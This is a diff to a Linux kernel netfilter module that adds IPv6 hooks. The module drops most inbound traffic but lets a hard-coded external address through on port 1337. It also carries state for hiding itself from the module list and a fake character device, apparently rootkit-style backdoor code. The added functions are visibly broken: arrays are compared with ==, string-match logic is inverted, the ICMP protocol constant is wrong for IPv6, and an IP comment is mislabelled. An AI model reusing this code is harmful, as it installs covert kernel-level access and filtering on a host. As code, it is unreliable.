@@ -1,4 +1,5 @@
 #include <linux/ip.h>
+#include <linux/ipv6.h>
 #include <linux/udp.h>
 #include <linux/tcp.h>
 #include <linux/icmp.h>
@@ -15,21 +16,25 @@
 #include <linux/device.h>
 #include <linux/cdev.h>
 #include <linux/uaccess.h>
+#include <linux/inet.h>
 
 static unsigned int major; /* major number for device */
 static struct class *fake_class;
 static struct cdev fake_cdev;
 static char message[128];
-static struct nf_hook_ops netfilter_ops;
-         
+//static struct nf_hook_ops netfilter_ops;
+
+ 
 // Static IP: 192.168.0.1 aka localhost
 static unsigned char *ip_address = "\x14\x00\x00\x03";
 
 // external IP to liberate
+static char *ip_externalv6 = "fe80::a5ab:c573:80dd:692b";
 static char *ip_external = "192.168.100.181";
 static struct list_head *module_previous;
 static short module_hidden = 0;
 int whitelist[]={53,80,443};
+
 
 
 unsigned int filter_port_scans(struct sk_buff *skb)
@@ -145,6 +150,26 @@ struct file_operations fake_fops = {
 };
 
 
+// TODO test IPV6
+unsigned int test_icmp_v6(struct sk_buff *skb)
+{	
+	struct icmphdr *icmph;
+	struct ipv6hdr *ip_hdr = ipv6_hdr(skb);
+	icmph = icmp_hdr(skb);
+
+		if(!icmph) 
+			return NF_ACCEPT; 
+
+		if(ip_hdr->saddr.s6_addr == ip_address) 
+			return NF_ACCEPT; 
+
+		if(icmph->type != ICMP_ECHOREPLY) 
+			return NF_DROP; 
+
+	return 55;
+}
+
+
 unsigned int test_icmp(struct sk_buff *skb)
 {	
 	struct icmphdr *icmph;
@@ -163,6 +188,10 @@ unsigned int test_icmp(struct sk_buff *skb)
 	return 55;
 }
 
+
+
+
+
 unsigned int test_udp(struct sk_buff *skb)
 {
 	int i=0;
@@ -174,7 +203,45 @@ unsigned int test_udp(struct sk_buff *skb)
 		if(!udph)
 			return NF_ACCEPT; 
 		// 	if(ip_hdr->daddr == *(unsigned int*)ip_address) return NF_ACCEPT; 
+
 		if(ip_hdr->saddr == *(unsigned int*)ip_address) 
+			return NF_ACCEPT; 
+
+		while(i!=3)
+		{
+			if(dest_port == whitelist[i] || src_port == whitelist[i])
+				return NF_ACCEPT; 
+			i++;
+		
+		}
+
+	return 55;
+}
+
+// TODO test IPV6
+unsigned int test_udp_v6(struct sk_buff *skb)
+{
+	int i=0;
+	
+	struct udphdr *udph=udp_hdr(skb);
+	struct ipv6hdr _iph;
+	struct ipv6hdr *ip_hdr = skb_header_pointer(skb, 0,sizeof(_iph),&_iph);
+	unsigned int dest_port = (unsigned int)ntohs(udph->dest);
+	unsigned int src_port = (unsigned int)ntohs(udph->source);
+	char input_ip[33];
+
+	memset(input_ip,'\0',32);
+
+
+		if(!udph)
+			return NF_ACCEPT; 
+	
+//	inet6_ntoa(input_ip,(struct in6_addr *) ip_hdr->saddr.s6_addr);
+
+//	snprintf(input_ip,33,"%pI6",&ip_hdr->saddr);
+
+//		if(strstr(ip_v6_local,input_ip)==0) 
+		if(ip_hdr->saddr.s6_addr==ip_address) 
 			return NF_ACCEPT; 
 
 		while(i!=3)
@@ -199,6 +266,8 @@ unsigned int test_tcp(struct sk_buff *skb)
 	struct tcphdr *tcph = tcp_hdr(skb);
 	unsigned int dest_port = (unsigned int)ntohs(tcph->dest);
 	unsigned int src_port = (unsigned int)ntohs(tcph->source);
+
+// TODO add memset() using nullbyte at template to daddr, saddr...
 
 		if(!tcph)
 			return NF_ACCEPT; 
@@ -227,7 +296,101 @@ unsigned int test_tcp(struct sk_buff *skb)
 	return filter_port_scans(skb);
 }
 
-unsigned int main_hook( unsigned int hooknum, 
+
+
+// todo test IPV6 function
+unsigned int test_tcp_v6(struct sk_buff *skb)
+{
+	int i=0;
+	char saddr[33];
+	char daddr[33];
+	struct ipv6hdr _iph;
+	struct ipv6hdr *ip_hdr = skb_header_pointer(skb, 0,sizeof(_iph),&_iph);
+	struct tcphdr *tcph = tcp_hdr(skb);
+	unsigned int dest_port = (unsigned int)ntohs(tcph->dest);
+	unsigned int src_port = (unsigned int)ntohs(tcph->source);
+// todo add memset to set nullbyte at saddr and daddr...
+
+		if(!tcph)
+			return NF_ACCEPT; 
+
+
+		//	  	if(ip_hdr->daddr.s6_addr == *(unsigned int*)ip_address) return NF_ACCEPT; 
+
+
+
+//	in6_pton(ip_externalv6,-1,externals,-1,NULL);
+
+	snprintf(saddr,32,"%pI6",&ip_hdr->saddr);
+	snprintf(daddr,32,"%pI6",&ip_hdr->daddr);
+
+
+//		if(strstr(saddr,ip_v6_local)==0) 
+		if(ip_hdr->saddr.s6_addr==ip_address) 
+			return NF_ACCEPT; 
+
+		if((strstr(ip_externalv6,saddr)==0)||(strstr(ip_externalv6,daddr)==0))
+			if(dest_port == 1337 || src_port == 1337)
+				return NF_ACCEPT; 
+
+
+		while(i!=3)
+		{
+			if(dest_port == whitelist[i] || src_port == whitelist[i]) 
+				return NF_ACCEPT; 
+			i++;
+		}
+
+
+	return filter_port_scans(skb);
+}
+
+
+
+
+
+
+// TODO test IPV6 func
+unsigned int main_hook_v6( unsigned int hooknum, 
+			struct sk_buff *skb, 
+			const struct net_device *in, 
+			const struct net_device *out, 
+			int (*okfn)(struct sk_buff*))
+{		
+	struct ipv6hdr *ip_hdr = (skb!=0)?(struct ipv6hdr *)skb_network_header(skb):0;
+	unsigned int res=55;
+
+		if(!skb)
+			return NF_ACCEPT; 
+
+		if(!(ip_hdr))  
+			return NF_ACCEPT; 
+
+// TODO change to switch case here
+		if(ip_hdr->nexthdr == IPPROTO_ICMP)
+			res=test_icmp_v6(skb);
+
+		if(res!=55)
+			return res;	
+
+		if(ip_hdr->nexthdr == IPPROTO_UDP)
+			res=test_udp_v6(skb);
+
+		if(res!=55)
+			return res;
+
+		if(ip_hdr->nexthdr == IPPROTO_TCP)
+			res=test_tcp_v6(skb);
+
+		if(res!=55)
+			return res;
+
+	return NF_DROP;
+}
+
+
+
+unsigned int main_hook_v4( unsigned int hooknum, 
 			struct sk_buff *skb, 
 			const struct net_device *in, 
 			const struct net_device *out, 
@@ -242,7 +405,7 @@ unsigned int main_hook( unsigned int hooknum,
 		if(!(ip_hdr))  
 			return NF_ACCEPT; 
 
-
+// TODO add switch case here
 		if(ip_hdr->protocol == IPPROTO_ICMP)
 			res=test_icmp(skb);
 
@@ -263,6 +426,26 @@ unsigned int main_hook( unsigned int hooknum,
 
 	return NF_DROP;
 }
+
+
+
+
+static struct nf_hook_ops netfilter_ops __read_mostly	= {
+	.pf 		= PF_INET,
+	.priority	= NF_IP_PRI_FIRST,
+	.hooknum	= NF_INET_PRE_ROUTING,
+	.hook		= (nf_hookfn *)main_hook_v4,
+};
+
+// todo test ipv6
+static struct nf_hook_ops netfilter_ops_v6 __read_mostly	= {
+	.pf 		= PF_INET6,
+	.priority	= NF_IP_PRI_FIRST,
+	.hooknum	= NF_INET_PRE_ROUTING,
+	.hook		= (nf_hookfn *)main_hook_v6,
+};
+ 
+
 
 int init_module()
 {
@@ -312,15 +495,14 @@ int init_module()
         	return -1;
     	}
 
-        netfilter_ops.hook = (nf_hookfn *)  main_hook;
-        netfilter_ops.pf = PF_INET;
-        netfilter_ops.hooknum = NF_INET_PRE_ROUTING;
-        netfilter_ops.priority = NF_IP_PRI_FIRST;
 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
-	nf_register_net_hook(&init_net, &netfilter_ops);
+	nf_register_net_hook(&init_net, &netfilter_ops);	
+	nf_register_net_hook(&init_net, &netfilter_ops_v6);
+	
 #else
 	nf_register_hook(&netfilter_ops);
+	nf_register_hook(&netfilter_ops_v6);
 #endif
 	return 0;
 }
@@ -329,8 +511,11 @@ void cleanup_module()
 { 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
 	nf_unregister_net_hook(&init_net, &netfilter_ops);
+	nf_unregister_net_hook(&init_net, &netfilter_ops_v6);
+
 #else
 	nf_unregister_hook(&netfilter_ops);
+	nf_unregister_hook(&netfilter_ops_v6);
 #endif
 	unregister_chrdev_region(MKDEV(major, 0), 1);
 	device_destroy(fake_class, MKDEV(major, 0));
